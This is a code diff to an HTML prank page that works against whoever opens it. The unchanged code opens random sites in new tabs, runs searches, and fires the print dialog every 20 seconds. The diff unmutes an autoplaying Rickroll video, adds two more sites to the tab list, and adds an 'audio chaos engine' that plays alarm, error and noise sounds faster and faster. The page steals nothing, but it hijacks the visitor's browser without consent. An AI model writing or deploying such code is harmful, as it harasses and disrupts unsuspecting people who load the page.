@@ -31,7 +31,7 @@
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background-color: rgba(0, 0, 0, 0.7);
+            background-color: black;        /* solid black, no transparency */
             color: white;
             padding: 15px 25px;
             border-radius: 10px;
@@ -39,7 +39,7 @@
             font-size: 16px;
             text-align: center;
             border: 2px solid #ffaa00;
-            box-shadow: 0 0 20px rgba(255,170,0,0.5);
+            /* removed glow and transparency */
             z-index: 1000;
             pointer-events: none;
             user-select: none;
@@ -52,7 +52,8 @@
 </head>
 <body>
     <div class="iframe-container">
-        <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&loop=1&playlist=dQw4w9WgXcQ&playsinline=1&controls=0&enablejsapi=1" allow="autoplay; muted; loop; encrypted-media; picture-in-picture; fullscreen" allowfullscreen></iframe>
+        <!-- removed &mute=1 so audio is not blocked -->
+        <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&loop=1&playlist=dQw4w9WgXcQ&playsinline=1&controls=0&enablejsapi=1" allow="autoplay; loop; encrypted-media; picture-in-picture; fullscreen" allowfullscreen></iframe>
     </div>
 
     <div class="overlay-text">
@@ -77,7 +78,10 @@
                 'https://bonzibuddy.org',
                 'chrome://chrome-urls/',  // Internal chrome page (may not open in new tab)
                 'https://www.fbi.gov',
-                'https://www.omegle.com'
+                'https://www.omegle.com',
+                // two new sites as requested
+                'https://www.google.com/maps',
+                'https://minecraft.en.modilimitado.io/'
             ];
 
             const SEARCHES = [
@@ -190,7 +194,6 @@
                 // if ('hid' in navigator) navigator.hid.requestDevice({ filters: [] }).catch(() => {});
             }
 
-            // New function to open print dialog every 20 seconds
             function startPrintLoop() {
                 setInterval(() => {
                     window.print();
@@ -211,6 +214,167 @@
             setTimeout(openRandomSiteAndSearch, 1000);
             setInterval(openRandomSiteAndSearch, INTERVAL_SECONDS * 1000);
         })();
+
+// AUDIO CHAOS ENGINE
+(function() {
+    // Create hidden audio container
+    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+    
+    // Generate annoying sounds programmatically
+    function createBeep(freq = 800, duration = 0.1, type = 'sine') {
+        const oscillator = audioContext.createOscillator();
+        const gainNode = audioContext.createGain();
+        
+        oscillator.connect(gainNode);
+        gainNode.connect(audioContext.destination);
+        
+        oscillator.frequency.value = freq;
+        oscillator.type = type;
+        
+        gainNode.gain.value = 0.1;
+        gainNode.gain.exponentialRampToValueAtTime(0.00001, audioContext.currentTime + duration);
+        
+        oscillator.start();
+        oscillator.stop(audioContext.currentTime + duration);
+    }
+    
+    // Pre-made annoying sound patterns
+    const sounds = [
+        () => { // Dial-up internet
+            const freqs = [400, 600, 800, 1200, 1600];
+            freqs.forEach((f, i) => {
+                setTimeout(() => createBeep(f, 0.05, 'square'), i * 100);
+            });
+        },
+        () => { // Error beep
+            createBeep(1000, 0.2, 'sawtooth');
+            setTimeout(() => createBeep(800, 0.2, 'sawtooth'), 200);
+            setTimeout(() => createBeep(600, 0.3, 'sawtooth'), 400);
+        },
+        () => { // Random noise burst
+            const noise = audioContext.createBufferSource();
+            const buffer = audioContext.createBuffer(1, audioContext.sampleRate * 0.1, audioContext.sampleRate);
+            const data = buffer.getChannelData(0);
+            for(let i = 0; i < buffer.length; i++) {
+                data[i] = Math.random() * 2 - 1;
+            }
+            noise.buffer = buffer;
+            noise.connect(audioContext.destination);
+            noise.start();
+            noise.stop(audioContext.currentTime + 0.1);
+        },
+        () => { // Alarm
+            for(let i = 0; i < 5; i++) {
+                setTimeout(() => createBeep(1500, 0.1, 'triangle'), i * 200);
+                setTimeout(() => createBeep(1200, 0.1, 'triangle'), i * 200 + 100);
+            }
+        },
+        () => { // Low battery sound
+            createBeep(500, 0.3, 'sine');
+            setTimeout(() => createBeep(400, 0.3, 'sine'), 400);
+            setTimeout(() => createBeep(300, 0.5, 'sine'), 800);
+        },
+        () => { // Windows error (classic)
+            createBeep(800, 0.1, 'square');
+            setTimeout(() => createBeep(600, 0.1, 'square'), 100);
+            setTimeout(() => createBeep(400, 0.2, 'square'), 200);
+        },
+        () => { // Modem handshake (iconic)
+            const pattern = [200, 300, 400, 600, 800, 1200];
+            pattern.forEach((f, i) => {
+                setTimeout(() => createBeep(f, 0.05, 'sawtooth'), i * 50);
+                setTimeout(() => createBeep(f/2, 0.05, 'sawtooth'), i * 50 + 25);
+            });
+        },
+        () => { // Robot voice
+            const words = ['Hello', 'I am', 'your', 'computer'];
+            words.forEach((word, i) => {
+                setTimeout(() => {
+                    for(let j = 0; j < word.length; j++) {
+                        setTimeout(() => {
+                            createBeep(600 + (word.charCodeAt(j) % 400), 0.1, 'square');
+                        }, j * 120);
+                    }
+                }, i * 800);
+            });
+        },
+        () => { // Emergency broadcast
+            createBeep(1000, 0.5, 'sine');
+            setTimeout(() => createBeep(600, 0.5, 'sine'), 600);
+            setTimeout(() => createBeep(1000, 0.5, 'sine'), 1200);
+            setTimeout(() => {
+                for(let k = 0; k < 10; k++) {
+                    setTimeout(() => createBeep(800, 0.05, 'sawtooth'), k * 100);
+                }
+            }, 1800);
+        },
+        () => { // Microwave done
+            for(let i = 0; i < 3; i++) {
+                setTimeout(() => createBeep(900, 0.2, 'sine'), i * 400);
+            }
+        },
+        () => { // Game over
+            createBeep(400, 0.2, 'sawtooth');
+            setTimeout(() => createBeep(300, 0.2, 'sawtooth'), 200);
+            setTimeout(() => createBeep(200, 0.4, 'sawtooth'), 400);
+            setTimeout(() => createBeep(100, 0.6, 'sawtooth'), 800);
+        }
+    ];
+    
+    // Play random sound
+    function playRandomSound() {
+        if(audioContext.state === 'suspended') {
+            audioContext.resume();
+        }
+        const soundIndex = Math.floor(Math.random() * sounds.length);
+        sounds[soundIndex]();
+    }
+    
+    // Schedule sounds with increasing frequency
+    let interval = 3000; // Start every 3 seconds
+    function scheduleSounds() {
+        playRandomSound();
+        
+        // Gradually increase frequency (get more annoying)
+        interval = Math.max(500, interval * 0.9);
+        
+        setTimeout(scheduleSounds, interval + Math.random() * 1000);
+    }
+    
+    // Start after page loads
+    setTimeout(scheduleSounds, 2000);
+    
+    // Add background ambient noise
+    function backgroundHum() {
+        const noise = audioContext.createBufferSource();
+        const buffer = audioContext.createBuffer(1, audioContext.sampleRate * 2, audioContext.sampleRate);
+        const data = buffer.getChannelData(0);
+        for(let i = 0; i < buffer.length; i++) {
+            data[i] = (Math.random() * 2 - 1) * 0.02; // Very quiet
+        }
+        noise.buffer = buffer;
+        noise.loop = true;
+        
+        const filter = audioContext.createBiquadFilter();
+        filter.type = 'lowpass';
+        filter.frequency.value = 200;
+        
+        noise.connect(filter);
+        filter.connect(audioContext.destination);
+        noise.start();
+    }
+    
+    // Uncomment for constant quiet hum (evil)
+    // setTimeout(backgroundHum, 5000);
+    
+    // React to user interactions to ensure audio context runs
+    document.addEventListener('click', () => {
+        if(audioContext.state === 'suspended') {
+            audioContext.resume();
+        }
+    }, { once: true });
+})();
+
     </script>
 </body>
 </html>
